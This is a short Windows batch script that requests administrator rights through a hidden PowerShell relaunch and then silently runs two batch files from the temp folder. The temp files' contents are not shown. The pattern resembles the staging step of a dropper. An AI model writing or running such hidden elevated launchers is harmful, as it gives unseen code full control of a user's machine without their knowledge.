@echo off

net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -command "Start-Process '%~dp0%~nx0' -Verb RunAs -WindowStyle Hidden"
    exit
)

if exist "%temp%\start.bat" (
    start /b "" "%temp%\start.bat" >nul 2>&1
)

if exist "%temp%\exit.bat" (
    start /b "" "%temp%\exit.bat" >nul 2>&1
)

exit